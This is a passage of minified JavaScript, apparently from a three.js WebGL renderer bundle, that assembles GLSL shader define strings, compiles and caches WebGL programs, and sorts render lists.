]").replace(/UNROLLED_LOOP_INDEX/g,s);return r}function Oa(i){let t="precision "+i.precision+` float;
precision `+i.precision+" int;";return i.precision==="highp"?t+=`
#define HIGH_PRECISION`:i.precision==="mediump"?t+=`
#define MEDIUM_PRECISION`:i.precision==="lowp"&&(t+=`
#define LOW_PRECISION`),t}function gf(i){let t="SHADOWMAP_TYPE_BASIC";return i.shadowMapType===to?t="SHADOWMAP_TYPE_PCF":i.shadowMapType===Vo?t="SHADOWMAP_TYPE_PCF_SOFT":i.shadowMapType===$e&&(t="SHADOWMAP_TYPE_VSM"),t}function vf(i){let t="ENVMAP_TYPE_CUBE";if(i.envMap)switch(i.envMapMode){case $n:case Kn:t="ENVMAP_TYPE_CUBE";break;case er:t="ENVMAP_TYPE_CUBE_UV";break}return t}function xf(i){let t="ENVMAP_MODE_REFLECTION";if(i.envMap)switch(i.envMapMode){case Kn:t="ENVMAP_MODE_REFRACTION";break}return t}function Ef(i){let t="ENVMAP_BLENDING_NONE";if(i.envMap)switch(i.combine){case eo:t="ENVMAP_BLENDING_MULTIPLY";break;case fl:t="ENVMAP_BLENDING_MIX";break;case hl:t="ENVMAP_BLENDING_ADD";break}return t}function yf(i){const t=i.envMapCubeUVHeight;if(t===null)return null;const e=Math.log2(t)-2,n=1/t;return{texelWidth:1/(3*Math.max(Math.pow(2,e),7*16)),texelHeight:n,maxMip:e}}function Mf(i,t,e,n){const r=i.getContext(),s=e.defines;let o=e.vertexShader,a=e.fragmentShader;const l=gf(e),c=vf(e),u=xf(e),h=Ef(e),p=yf(e),m=e.isWebGL2?"":lf(e),E=cf(e),x=df(s),f=r.createProgram();let d,g,_=e.glslVersion?"#version "+e.glslVersion+`
`:"";e.isRawShaderMaterial?(d=["#define SHADER_TYPE "+e.shaderType,"#define SHADER_NAME "+e.shaderName,x].filter(qn).join(`
`),d.length>0&&(d+=`
`),g=[m,"#define SHADER_TYPE "+e.shaderType,"#define SHADER_NAME "+e.shaderName,x].filter(qn).join(`
`),g.length>0&&(g+=`
`)):(d=[Oa(e),"#define SHADER_TYPE "+e.shaderType,"#define SHADER_NAME "+e.shaderName,x,e.extensionClipCullDistance?"#define USE_CLIP_DISTANCE":"",e.batching?"#define USE_BATCHING":"",e.instancing?"#define USE_INSTANCING":"",e.instancingColor?"#define USE_INSTANCING_COLOR":"",e.useFog&&e.fog?"#define USE_FOG":"",e.useFog&&e.fogExp2?"#define FOG_EXP2":"",e.map?"#define USE_MAP":"",e.envMap?"#define USE_ENVMAP":"",e.envMap?"#define "+u:"",e.lightMap?"#define USE_LIGHTMAP":"",e.aoMap?"#define USE_AOMAP":"",e.bumpMap?"#define USE_BUMPMAP":"",e.normalMap?"#define USE_NORMALMAP":"",e.normalMapObjectSpace?"#define USE_NORMALMAP_OBJECTSPACE":"",e.normalMapTangentSpace?"#define USE_NORMALMAP_TANGENTSPACE":"",e.displacementMap?"#define USE_DISPLACEMENTMAP":"",e.emissiveMap?"#define USE_EMISSIVEMAP":"",e.anisotropy?"#define USE_ANISOTROPY":"",e.anisotropyMap?"#define USE_ANISOTROPYMAP":"",e.clearcoatMap?"#define USE_CLEARCOATMAP":"",e.clearcoatRoughnessMap?"#define USE_CLEARCOAT_ROUGHNESSMAP":"",e.clearcoatNormalMap?"#define USE_CLEARCOAT_NORMALMAP":"",e.iridescenceMap?"#define USE_IRIDESCENCEMAP":"",e.iridescenceThicknessMap?"#define USE_IRIDESCENCE_THICKNESSMAP":"",e.specularMap?"#define USE_SPECULARMAP":"",e.specularColorMap?"#define USE_SPECULAR_COLORMAP":"",e.specularIntensityMap?"#define USE_SPECULAR_INTENSITYMAP":"",e.roughnessMap?"#define USE_ROUGHNESSMAP":"",e.metalnessMap?"#define USE_METALNESSMAP":"",e.alphaMap?"#define USE_ALPHAMAP":"",e.alphaHash?"#define USE_ALPHAHASH":"",e.transmission?"#define USE_TRANSMISSION":"",e.transmissionMap?"#define USE_TRANSMISSIONMAP":"",e.thicknessMap?"#define USE_THICKNESSMAP":"",e.sheenColorMap?"#define USE_SHEEN_COLORMAP":"",e.sheenRoughnessMap?"#define USE_SHEEN_ROUGHNESSMAP":"",e.mapUv?"#define MAP_UV "+e.mapUv:"",e.alphaMapUv?"#define ALPHAMAP_UV "+e.alphaMapUv:"",e.lightMapUv?"#define LIGHTMAP_UV "+e.lightMapUv:"",e.aoMapUv?"#define AOMAP_UV "+e.aoMapUv:"",e.emissiveMapUv?"#define EMISSIVEMAP_UV "+e.emissiveMapUv:"",e.bumpMapUv?"#define BUMPMAP_UV "+e.bumpMapUv:"",e.normalMapUv?"#define NORMALMAP_UV "+e.normalMapUv:"",e.displacementMapUv?"#define DISPLACEMENTMAP_UV "+e.displacementMapUv:"",e.metalnessMapUv?"#define METALNESSMAP_UV "+e.metalnessMapUv:"",e.roughnessMapUv?"#define ROUGHNESSMAP_UV "+e.roughnessMapUv:"",e.anisotropyMapUv?"#define ANISOTROPYMAP_UV "+e.anisotropyMapUv:"",e.clearcoatMapUv?"#define CLEARCOATMAP_UV "+e.clearcoatMapUv:"",e.clearcoatNormalMapUv?"#define CLEARCOAT_NORMALMAP_UV "+e.clearcoatNormalMapUv:"",e.clearcoatRoughnessMapUv?"#define CLEARCOAT_ROUGHNESSMAP_UV "+e.clearcoatRoughnessMapUv:"",e.iridescenceMapUv?"#define IRIDESCENCEMAP_UV "+e.iridescenceMapUv:"",e.iridescenceThicknessMapUv?"#define IRIDESCENCE_THICKNESSMAP_UV "+e.iridescenceThicknessMapUv:"",e.sheenColorMapUv?"#define SHEEN_COLORMAP_UV "+e.sheenColorMapUv:"",e.sheenRoughnessMapUv?"#define SHEEN_ROUGHNESSMAP_UV "+e.sheenRoughnessMapUv:"",e.specularMapUv?"#define SPECULARMAP_UV "+e.specularMapUv:"",e.specularColorMapUv?"#define SPECULAR_COLORMAP_UV "+e.specularColorMapUv:"",e.specularIntensityMapUv?"#define SPECULAR_INTENSITYMAP_UV "+e.specularIntensityMapUv:"",e.transmissionMapUv?"#define TRANSMISSIONMAP_UV "+e.transmissionMapUv:"",e.thicknessMapUv?"#define THICKNESSMAP_UV "+e.thicknessMapUv:"",e.vertexTangents&&e.flatShading===!1?"#define USE_TANGENT":"",e.vertexColors?"#define USE_COLOR":"",e.vertexAlphas?"#define USE_COLOR_ALPHA":"",e.vertexUv1s?"#define USE_UV1":"",e.vertexUv2s?"#define USE_UV2":"",e.vertexUv3s?"#define USE_UV3":"",e.pointsUvs?"#define USE_POINTS_UV":"",e.flatShading?"#define FLAT_SHADED":"",e.skinning?"#define USE_SKINNING":"",e.morphTargets?"#define USE_MORPHTARGETS":"",e.morphNormals&&e.flatShading===!1?"#define USE_MORPHNORMALS":"",e.morphColors&&e.isWebGL2?"#define USE_MORPHCOLORS":"",e.morphTargetsCount>0&&e.isWebGL2?"#define MORPHTARGETS_TEXTURE":"",e.morphTargetsCount>0&&e.isWebGL2?"#define MORPHTARGETS_TEXTURE_STRIDE "+e.morphTextureStride:"",e.morphTargetsCount>0&&e.isWebGL2?"#define MORPHTARGETS_COUNT "+e.morphTargetsCount:"",e.doubleSided?"#define DOUBLE_SIDED":"",e.flipSided?"#define FLIP_SIDED":"",e.shadowMapEnabled?"#define USE_SHADOWMAP":"",e.shadowMapEnabled?"#define "+l:"",e.sizeAttenuation?"#define USE_SIZEATTENUATION":"",e.numLightProbes>0?"#define USE_LIGHT_PROBES":"",e.useLegacyLights?"#define LEGACY_LIGHTS":"",e.logarithmicDepthBuffer?"#define USE_LOGDEPTHBUF":"",e.logarithmicDepthBuffer&&e.rendererExtensionFragDepth?"#define USE_LOGDEPTHBUF_EXT":"","uniform mat4 modelMatrix;","uniform mat4 modelViewMatrix;","uniform mat4 projectionMatrix;","uniform mat4 viewMatrix;","uniform mat3 normalMatrix;","uniform vec3 cameraPosition;","uniform bool isOrthographic;","#ifdef USE_INSTANCING","	attribute mat4 instanceMatrix;","#endif","#ifdef USE_INSTANCING_COLOR","	attribute vec3 instanceColor;","#endif","attribute vec3 position;","attribute vec3 normal;","attribute vec2 uv;","#ifdef USE_UV1","	attribute vec2 uv1;","#endif","#ifdef USE_UV2","	attribute vec2 uv2;","#endif","#ifdef USE_UV3","	attribute vec2 uv3;","#endif","#ifdef USE_TANGENT","	attribute vec4 tangent;","#endif","#if defined( USE_COLOR_ALPHA )","	attribute vec4 color;","#elif defined( USE_COLOR )","	attribute vec3 color;","#endif","#if ( defined( USE_MORPHTARGETS ) && ! defined( MORPHTARGETS_TEXTURE ) )","	attribute vec3 morphTarget0;","	attribute vec3 morphTarget1;","	attribute vec3 morphTarget2;","	attribute vec3 morphTarget3;","	#ifdef USE_MORPHNORMALS","		attribute vec3 morphNormal0;","		attribute vec3 morphNormal1;","		attribute vec3 morphNormal2;","		attribute vec3 morphNormal3;","	#else","		attribute vec3 morphTarget4;","		attribute vec3 morphTarget5;","		attribute vec3 morphTarget6;","		attribute vec3 morphTarget7;","	#endif","#endif","#ifdef USE_SKINNING","	attribute vec4 skinIndex;","	attribute vec4 skinWeight;","#endif",`
`].filter(qn).join(`
`),g=[m,Oa(e),"#define SHADER_TYPE "+e.shaderType,"#define SHADER_NAME "+e.shaderName,x,e.useFog&&e.fog?"#define USE_FOG":"",e.useFog&&e.fogExp2?"#define FOG_EXP2":"",e.map?"#define USE_MAP":"",e.matcap?"#define USE_MATCAP":"",e.envMap?"#define USE_ENVMAP":"",e.envMap?"#define "+c:"",e.envMap?"#define "+u:"",e.envMap?"#define "+h:"",p?"#define CUBEUV_TEXEL_WIDTH "+p.texelWidth:"",p?"#define CUBEUV_TEXEL_HEIGHT "+p.texelHeight:"",p?"#define CUBEUV_MAX_MIP "+p.maxMip+".0":"",e.lightMap?"#define USE_LIGHTMAP":"",e.aoMap?"#define USE_AOMAP":"",e.bumpMap?"#define USE_BUMPMAP":"",e.normalMap?"#define USE_NORMALMAP":"",e.normalMapObjectSpace?"#define USE_NORMALMAP_OBJECTSPACE":"",e.normalMapTangentSpace?"#define USE_NORMALMAP_TANGENTSPACE":"",e.emissiveMap?"#define USE_EMISSIVEMAP":"",e.anisotropy?"#define USE_ANISOTROPY":"",e.anisotropyMap?"#define USE_ANISOTROPYMAP":"",e.clearcoat?"#define USE_CLEARCOAT":"",e.clearcoatMap?"#define USE_CLEARCOATMAP":"",e.clearcoatRoughnessMap?"#define USE_CLEARCOAT_ROUGHNESSMAP":"",e.clearcoatNormalMap?"#define USE_CLEARCOAT_NORMALMAP":"",e.iridescence?"#define USE_IRIDESCENCE":"",e.iridescenceMap?"#define USE_IRIDESCENCEMAP":"",e.iridescenceThicknessMap?"#define USE_IRIDESCENCE_THICKNESSMAP":"",e.specularMap?"#define USE_SPECULARMAP":"",e.specularColorMap?"#define USE_SPECULAR_COLORMAP":"",e.specularIntensityMap?"#define USE_SPECULAR_INTENSITYMAP":"",e.roughnessMap?"#define USE_ROUGHNESSMAP":"",e.metalnessMap?"#define USE_METALNESSMAP":"",e.alphaMap?"#define USE_ALPHAMAP":"",e.alphaTest?"#define USE_ALPHATEST":"",e.alphaHash?"#define USE_ALPHAHASH":"",e.sheen?"#define USE_SHEEN":"",e.sheenColorMap?"#define USE_SHEEN_COLORMAP":"",e.sheenRoughnessMap?"#define USE_SHEEN_ROUGHNESSMAP":"",e.transmission?"#define USE_TRANSMISSION":"",e.transmissionMap?"#define USE_TRANSMISSIONMAP":"",e.thicknessMap?"#define USE_THICKNESSMAP":"",e.vertexTangents&&e.flatShading===!1?"#define USE_TANGENT":"",e.vertexColors||e.instancingColor?"#define USE_COLOR":"",e.vertexAlphas?"#define USE_COLOR_ALPHA":"",e.vertexUv1s?"#define USE_UV1":"",e.vertexUv2s?"#define USE_UV2":"",e.vertexUv3s?"#define USE_UV3":"",e.pointsUvs?"#define USE_POINTS_UV":"",e.gradientMap?"#define USE_GRADIENTMAP":"",e.flatShading?"#define FLAT_SHADED":"",e.doubleSided?"#define DOUBLE_SIDED":"",e.flipSided?"#define FLIP_SIDED":"",e.shadowMapEnabled?"#define USE_SHADOWMAP":"",e.shadowMapEnabled?"#define "+l:"",e.premultipliedAlpha?"#define PREMULTIPLIED_ALPHA":"",e.numLightProbes>0?"#define USE_LIGHT_PROBES":"",e.useLegacyLights?"#define LEGACY_LIGHTS":"",e.decodeVideoTexture?"#define DECODE_VIDEO_TEXTURE":"",e.logarithmicDepthBuffer?"#define USE_LOGDEPTHBUF":"",e.logarithmicDepthBuffer&&e.rendererExtensionFragDepth?"#define USE_LOGDEPTHBUF_EXT":"","uniform mat4 viewMatrix;","uniform vec3 cameraPosition;","uniform bool isOrthographic;",e.toneMapping!==on?"#define TONE_MAPPING":"",e.toneMapping!==on?It.tonemapping_pars_fragment:"",e.toneMapping!==on?of("toneMapping",e.toneMapping):"",e.dithering?"#define DITHERING":"",e.opaque?"#define OPAQUE":"",It.colorspace_pars_fragment,af("linearToOutputTexel",e.outputColorSpace),e.useDepthPacking?"#define DEPTH_PACKING "+e.depthPacking:"",`
`].filter(qn).join(`
`)),o=ns(o),o=Da(o,e),o=Na(o,e),a=ns(a),a=Da(a,e),a=Na(a,e),o=Ua(o),a=Ua(a),e.isWebGL2&&e.isRawShaderMaterial!==!0&&(_=`#version 300 es
`,d=[E,"precision mediump sampler2DArray;","#define attribute in","#define varying out","#define texture2D texture"].join(`
`)+`
`+d,g=["precision mediump sampler2DArray;","#define varying in",e.glslVersion===ta?"":"layout(location = 0) out highp vec4 pc_fragColor;",e.glslVersion===ta?"":"#define gl_FragColor pc_fragColor","#define gl_FragDepthEXT gl_FragDepth","#define texture2D texture","#define textureCube texture","#define texture2DProj textureProj","#define texture2DLodEXT textureLod","#define texture2DProjLodEXT textureProjLod","#define textureCubeLodEXT textureLod","#define texture2DGradEXT textureGrad","#define texture2DProjGradEXT textureProjGrad","#define textureCubeGradEXT textureGrad"].join(`
`)+`
`+g);const v=_+d+o,w=_+g+a,S=Ia(r,r.VERTEX_SHADER,v),T=Ia(r,r.FRAGMENT_SHADER,w);r.attachShader(f,S),r.attachShader(f,T),e.index0AttributeName!==void 0?r.bindAttribLocation(f,0,e.index0AttributeName):e.morphTargets===!0&&r.bindAttribLocation(f,0,"position"),r.linkProgram(f);function D(X){if(i.debug.checkShaderErrors){const et=r.getProgramInfoLog(f).trim(),P=r.getShaderInfoLog(S).trim(),B=r.getShaderInfoLog(T).trim();let W=!0,Y=!0;if(r.getProgramParameter(f,r.LINK_STATUS)===!1)if(W=!1,typeof i.debug.onShaderError=="function")i.debug.onShaderError(r,f,S,T);else{const H=La(r,S,"vertex"),V=La(r,T,"fragment");console.error("THREE.WebGLProgram: Shader Error "+r.getError()+" - VALIDATE_STATUS "+r.getProgramParameter(f,r.VALIDATE_STATUS)+`

Program Info Log: `+et+`
`+H+`
`+V)}else et!==""?console.warn("THREE.WebGLProgram: Program Info Log:",et):(P===""||B==="")&&(Y=!1);Y&&(X.diagnostics={runnable:W,programLog:et,vertexShader:{log:P,prefix:d},fragmentShader:{log:B,prefix:g}})}r.deleteShader(S),r.deleteShader(T),y=new qi(r,f),R=uf(r,f)}let y;this.getUniforms=function(){return y===void 0&&D(this),y};let R;this.getAttributes=function(){return R===void 0&&D(this),R};let k=e.rendererExtensionParallelShaderCompile===!1;return this.isReady=function(){return k===!1&&(k=r.getProgramParameter(f,ef)),k},this.destroy=function(){n.releaseStatesOfProgram(this),r.deleteProgram(f),this.program=void 0},this.type=e.shaderType,this.name=e.shaderName,this.id=nf++,this.cacheKey=t,this.usedTimes=1,this.program=f,this.vertexShader=S,this.fragmentShader=T,this}let Sf=0;class bf{constructor(){this.shaderCache=new Map,this.materialCache=new Map}update(t){const e=t.vertexShader,n=t.fragmentShader,r=this._getShaderStage(e),s=this._getShaderStage(n),o=this._getShaderCacheForMaterial(t);return o.has(r)===!1&&(o.add(r),r.usedTimes++),o.has(s)===!1&&(o.add(s),s.usedTimes++),this}remove(t){const e=this.materialCache.get(t);for(const n of e)n.usedTimes--,n.usedTimes===0&&this.shaderCache.delete(n.code);return this.materialCache.delete(t),this}getVertexShaderID(t){return this._getShaderStage(t.vertexShader).id}getFragmentShaderID(t){return this._getShaderStage(t.fragmentShader).id}dispose(){this.shaderCache.clear(),this.materialCache.clear()}_getShaderCacheForMaterial(t){const e=this.materialCache;let n=e.get(t);return n===void 0&&(n=new Set,e.set(t,n)),n}_getShaderStage(t){const e=this.shaderCache;let n=e.get(t);return n===void 0&&(n=new Tf(t),e.set(t,n)),n}}class Tf{constructor(t){this.id=Sf++,this.code=t,this.usedTimes=0}}function Af(i,t,e,n,r,s,o){const a=new cs,l=new bf,c=[],u=r.isWebGL2,h=r.logarithmicDepthBuffer,p=r.vertexTextures;let m=r.precision;const E={MeshDepthMaterial:"depth",MeshDistanceMaterial:"distanceRGBA",MeshNormalMaterial:"normal",MeshBasicMaterial:"basic",MeshLambertMaterial:"lambert",MeshPhongMaterial:"phong",MeshToonMaterial:"toon",MeshStandardMaterial:"physical",MeshPhysicalMaterial:"physical",MeshMatcapMaterial:"matcap",LineBasicMaterial:"basic",LineDashedMaterial:"dashed",PointsMaterial:"points",ShadowMaterial:"shadow",SpriteMaterial:"sprite"};function x(y){return y===0?"uv":`uv${y}`}function f(y,R,k,X,et){const P=X.fog,B=et.geometry,W=y.isMeshStandardMaterial?X.environment:null,Y=(y.isMeshStandardMaterial?e:t).get(y.envMap||W),H=Y&&Y.mapping===er?Y.image.height:null,V=E[y.type];y.precision!==null&&(m=r.getMaxPrecision(y.precision),m!==y.precision&&console.warn("THREE.WebGLProgram.getParameters:",y.precision,"not supported, using",m,"instead."));const q=B.morphAttributes.position||B.morphAttributes.normal||B.morphAttributes.color,J=q!==void 0?q.length:0;let K=0;B.morphAttributes.position!==void 0&&(K=1),B.morphAttributes.normal!==void 0&&(K=2),B.morphAttributes.color!==void 0&&(K=3);let G,j,rt,pt;if(V){const he=Ge[V];G=he.vertexShader,j=he.fragmentShader}else G=y.vertexShader,j=y.fragmentShader,l.update(y),rt=l.getVertexShaderID(y),pt=l.getFragmentShaderID(y);const ut=i.getRenderTarget(),St=et.isInstancedMesh===!0,Tt=et.isBatchedMesh===!0,gt=!!y.map,Ut=!!y.matcap,N=!!Y,ne=!!y.aoMap,vt=!!y.lightMap,Rt=!!y.bumpMap,ft=!!y.normalMap,$t=!!y.displacementMap,Lt=!!y.emissiveMap,A=!!y.metalnessMap,M=!!y.roughnessMap,O=y.anisotropy>0,Q=y.clearcoat>0,Z=y.iridescence>0,tt=y.sheen>0,ht=y.transmission>0,ot=O&&!!y.anisotropyMap,ct=Q&&!!y.clearcoatMap,yt=Q&&!!y.clearcoatNormalMap,Dt=Q&&!!y.clearcoatRoughnessMap,$=Z&&!!y.iridescenceMap,Vt=Z&&!!y.iridescenceThicknessMap,Bt=tt&&!!y.sheenColorMap,At=tt&&!!y.sheenRoughnessMap,_t=!!y.specularMap,dt=!!y.specularColorMap,Pt=!!y.specularIntensityMap,Gt=ht&&!!y.transmissionMap,Jt=ht&&!!y.thicknessMap,Ot=!!y.gradientMap,nt=!!y.alphaMap,C=y.alphaTest>0,st=!!y.alphaHash,at=!!y.extensions,Mt=!!B.attributes.uv1,xt=!!B.attributes.uv2,Xt=!!B.attributes.uv3;let qt=on;return y.toneMapped&&(ut===null||ut.isXRRenderTarget===!0)&&(qt=i.toneMapping),{isWebGL2:u,shaderID:V,shaderType:y.type,shaderName:y.name,vertexShader:G,fragmentShader:j,defines:y.defines,customVertexShaderID:rt,customFragmentShaderID:pt,isRawShaderMaterial:y.isRawShaderMaterial===!0,glslVersion:y.glslVersion,precision:m,batching:Tt,instancing:St,instancingColor:St&&et.instanceColor!==null,supportsVertexTextures:p,outputColorSpace:ut===null?i.outputColorSpace:ut.isXRRenderTarget===!0?ut.texture.colorSpace:Ze,map:gt,matcap:Ut,envMap:N,envMapMode:N&&Y.mapping,envMapCubeUVHeight:H,aoMap:ne,lightMap:vt,bumpMap:Rt,normalMap:ft,displacementMap:p&&$t,emissiveMap:Lt,normalMapObjectSpace:ft&&y.normalMapType===Dl,normalMapTangentSpace:ft&&y.normalMapType===Ll,metalnessMap:A,roughnessMap:M,anisotropy:O,anisotropyMap:ot,clearcoat:Q,clearcoatMap:ct,clearcoatNormalMap:yt,clearcoatRoughnessMap:Dt,iridescence:Z,iridescenceMap:$,iridescenceThicknessMap:Vt,sheen:tt,sheenColorMap:Bt,sheenRoughnessMap:At,specularMap:_t,specularColorMap:dt,specularIntensityMap:Pt,transmission:ht,transmissionMap:Gt,thicknessMap:Jt,gradientMap:Ot,opaque:y.transparent===!1&&y.blending===Yn,alphaMap:nt,alphaTest:C,alphaHash:st,combine:y.combine,mapUv:gt&&x(y.map.channel),aoMapUv:ne&&x(y.aoMap.channel),lightMapUv:vt&&x(y.lightMap.channel),bumpMapUv:Rt&&x(y.bumpMap.channel),normalMapUv:ft&&x(y.normalMap.channel),displacementMapUv:$t&&x(y.displacementMap.channel),emissiveMapUv:Lt&&x(y.emissiveMap.channel),metalnessMapUv:A&&x(y.metalnessMap.channel),roughnessMapUv:M&&x(y.roughnessMap.channel),anisotropyMapUv:ot&&x(y.anisotropyMap.channel),clearcoatMapUv:ct&&x(y.clearcoatMap.channel),clearcoatNormalMapUv:yt&&x(y.clearcoatNormalMap.channel),clearcoatRoughnessMapUv:Dt&&x(y.clearcoatRoughnessMap.channel),iridescenceMapUv:$&&x(y.iridescenceMap.channel),iridescenceThicknessMapUv:Vt&&x(y.iridescenceThicknessMap.channel),sheenColorMapUv:Bt&&x(y.sheenColorMap.channel),sheenRoughnessMapUv:At&&x(y.sheenRoughnessMap.channel),specularMapUv:_t&&x(y.specularMap.channel),specularColorMapUv:dt&&x(y.specularColorMap.channel),specularIntensityMapUv:Pt&&x(y.specularIntensityMap.channel),transmissionMapUv:Gt&&x(y.transmissionMap.channel),thicknessMapUv:Jt&&x(y.thicknessMap.channel),alphaMapUv:nt&&x(y.alphaMap.channel),vertexTangents:!!B.attributes.tangent&&(ft||O),vertexColors:y.vertexColors,vertexAlphas:y.vertexColors===!0&&!!B.attributes.color&&B.attributes.color.itemSize===4,vertexUv1s:Mt,vertexUv2s:xt,vertexUv3s:Xt,pointsUvs:et.isPoints===!0&&!!B.attributes.uv&&(gt||nt),fog:!!P,useFog:y.fog===!0,fogExp2:P&&P.isFogExp2,flatShading:y.flatShading===!0,sizeAttenuation:y.sizeAttenuation===!0,logarithmicDepthBuffer:h,skinning:et.isSkinnedMesh===!0,morphTargets:B.morphAttributes.position!==void 0,morphNormals:B.morphAttributes.normal!==void 0,morphColors:B.morphAttributes.color!==void 0,morphTargetsCount:J,morphTextureStride:K,numDirLights:R.directional.length,numPointLights:R.point.length,numSpotLights:R.spot.length,numSpotLightMaps:R.spotLightMap.length,numRectAreaLights:R.rectArea.length,numHemiLights:R.hemi.length,numDirLightShadows:R.directionalShadowMap.length,numPointLightShadows:R.pointShadowMap.length,numSpotLightShadows:R.spotShadowMap.length,numSpotLightShadowsWithMaps:R.numSpotLightShadowsWithMaps,numLightProbes:R.numLightProbes,numClippingPlanes:o.numPlanes,numClipIntersection:o.numIntersection,dithering:y.dithering,shadowMapEnabled:i.shadowMap.enabled&&k.length>0,shadowMapType:i.shadowMap.type,toneMapping:qt,useLegacyLights:i._useLegacyLights,decodeVideoTexture:gt&&y.map.isVideoTexture===!0&&Wt.getTransfer(y.map.colorSpace)===jt,premultipliedAlpha:y.premultipliedAlpha,doubleSided:y.side===Oe,flipSided:y.side===Ee,useDepthPacking:y.depthPacking>=0,depthPacking:y.depthPacking||0,index0AttributeName:y.index0AttributeName,extensionDerivatives:at&&y.extensions.derivatives===!0,extensionFragDepth:at&&y.extensions.fragDepth===!0,extensionDrawBuffers:at&&y.extensions.drawBuffers===!0,extensionShaderTextureLOD:at&&y.extensions.shaderTextureLOD===!0,extensionClipCullDistance:at&&y.extensions.clipCullDistance&&n.has("WEBGL_clip_cull_distance"),rendererExtensionFragDepth:u||n.has("EXT_frag_depth"),rendererExtensionDrawBuffers:u||n.has("WEBGL_draw_buffers"),rendererExtensionShaderTextureLod:u||n.has("EXT_shader_texture_lod"),rendererExtensionParallelShaderCompile:n.has("KHR_parallel_shader_compile"),customProgramCacheKey:y.customProgramCacheKey()}}function d(y){const R=[];if(y.shaderID?R.push(y.shaderID):(R.push(y.customVertexShaderID),R.push(y.customFragmentShaderID)),y.defines!==void 0)for(const k in y.defines)R.push(k),R.push(y.defines[k]);return y.isRawShaderMaterial===!1&&(g(R,y),_(R,y),R.push(i.outputColorSpace)),R.push(y.customProgramCacheKey),R.join()}function g(y,R){y.push(R.precision),y.push(R.outputColorSpace),y.push(R.envMapMode),y.push(R.envMapCubeUVHeight),y.push(R.mapUv),y.push(R.alphaMapUv),y.push(R.lightMapUv),y.push(R.aoMapUv),y.push(R.bumpMapUv),y.push(R.normalMapUv),y.push(R.displacementMapUv),y.push(R.emissiveMapUv),y.push(R.metalnessMapUv),y.push(R.roughnessMapUv),y.push(R.anisotropyMapUv),y.push(R.clearcoatMapUv),y.push(R.clearcoatNormalMapUv),y.push(R.clearcoatRoughnessMapUv),y.push(R.iridescenceMapUv),y.push(R.iridescenceThicknessMapUv),y.push(R.sheenColorMapUv),y.push(R.sheenRoughnessMapUv),y.push(R.specularMapUv),y.push(R.specularColorMapUv),y.push(R.specularIntensityMapUv),y.push(R.transmissionMapUv),y.push(R.thicknessMapUv),y.push(R.combine),y.push(R.fogExp2),y.push(R.sizeAttenuation),y.push(R.morphTargetsCount),y.push(R.morphAttributeCount),y.push(R.numDirLights),y.push(R.numPointLights),y.push(R.numSpotLights),y.push(R.numSpotLightMaps),y.push(R.numHemiLights),y.push(R.numRectAreaLights),y.push(R.numDirLightShadows),y.push(R.numPointLightShadows),y.push(R.numSpotLightShadows),y.push(R.numSpotLightShadowsWithMaps),y.push(R.numLightProbes),y.push(R.shadowMapType),y.push(R.toneMapping),y.push(R.numClippingPlanes),y.push(R.numClipIntersection),y.push(R.depthPacking)}function _(y,R){a.disableAll(),R.isWebGL2&&a.enable(0),R.supportsVertexTextures&&a.enable(1),R.instancing&&a.enable(2),R.instancingColor&&a.enable(3),R.matcap&&a.enable(4),R.envMap&&a.enable(5),R.normalMapObjectSpace&&a.enable(6),R.normalMapTangentSpace&&a.enable(7),R.clearcoat&&a.enable(8),R.iridescence&&a.enable(9),R.alphaTest&&a.enable(10),R.vertexColors&&a.enable(11),R.vertexAlphas&&a.enable(12),R.vertexUv1s&&a.enable(13),R.vertexUv2s&&a.enable(14),R.vertexUv3s&&a.enable(15),R.vertexTangents&&a.enable(16),R.anisotropy&&a.enable(17),R.alphaHash&&a.enable(18),R.batching&&a.enable(19),y.push(a.mask),a.disableAll(),R.fog&&a.enable(0),R.useFog&&a.enable(1),R.flatShading&&a.enable(2),R.logarithmicDepthBuffer&&a.enable(3),R.skinning&&a.enable(4),R.morphTargets&&a.enable(5),R.morphNormals&&a.enable(6),R.morphColors&&a.enable(7),R.premultipliedAlpha&&a.enable(8),R.shadowMapEnabled&&a.enable(9),R.useLegacyLights&&a.enable(10),R.doubleSided&&a.enable(11),R.flipSided&&a.enable(12),R.useDepthPacking&&a.enable(13),R.dithering&&a.enable(14),R.transmission&&a.enable(15),R.sheen&&a.enable(16),R.opaque&&a.enable(17),R.pointsUvs&&a.enable(18),R.decodeVideoTexture&&a.enable(19),y.push(a.mask)}function v(y){const R=E[y.type];let k;if(R){const X=Ge[R];k=ac.clone(X.uniforms)}else k=y.uniforms;return k}function w(y,R){let k;for(let X=0,et=c.length;X<et;X++){const P=c[X];if(P.cacheKey===R){k=P,++k.usedTimes;break}}return k===void 0&&(k=new Mf(i,R,y,s),c.push(k)),k}function S(y){if(--y.usedTimes===0){const R=c.indexOf(y);c[R]=c[c.length-1],c.pop(),y.destroy()}}function T(y){l.remove(y)}function D(){l.dispose()}return{getParameters:f,getProgramCacheKey:d,getUniforms:v,acquireProgram:w,releaseProgram:S,releaseShaderCache:T,programs:c,dispose:D}}function Rf(){let i=new WeakMap;function t(s){let o=i.get(s);return o===void 0&&(o={},i.set(s,o)),o}function e(s){i.delete(s)}function n(s,o,a){i.get(s)[o]=a}function r(){i=new WeakMap}return{get:t,remove:e,update:n,dispose:r}}function wf(i,t){return i.groupOrder!==t.groupOrder?i.groupOrder-t.groupOrder:i.renderOrder!==t.renderOrder?i.renderOrder-t.renderOrder:i.material.id!==t.material.id?i.material.id-t.material.id:i.z!==t.z?i.z-t.z:i.id-t.id}function Fa(i,t){return i.groupOrder!==t.groupOrder?i.groupOrder-t.groupOrder:i.renderOrder!==t.renderOrder?i.renderOrder-t.renderOrder:i.z!==t.z?t.z-i.z:i.id-t.id}function ka(){const i=[];let t=0;const e=[],n=[],r=[];function s(){t=0,e.length=0,n.length=0,r.length=0}function o(h,p,m,E,x,f){let d=i[t];return d===void 0?(d={id:h.id,object:h,geometry:p,material:m,groupOrder:E,renderOrder:h.renderOrder,z:x,group:f},i[t]=d):(d.id=h.id,d.object=h,d.geometry=p,d.material=m,d.groupOrder=E,d.renderOrder=h.renderOrder,d.z=x,d.group=f),t++,d}function a(h,p,m,E,x,f){const d=o(h,p,m,E,x,f);m.transmission>0?n.push(d):m.transparent===!0?r.push(d):e.push(d)}function l(h,p,m,E,x,f){const d=o(h,p,m,E,x,f);m.transmission>0?n.unshift(d):m.transparent===!0?r.unshift(d):e.unshift(d)}function c(h,p){e.length>1&&e.sort(h||wf),n.length>1&&n.sort(p||Fa),r.length>1&&r.sort(p||Fa)}function u(){for(let h=t,p=i.length;h<p;h++){const 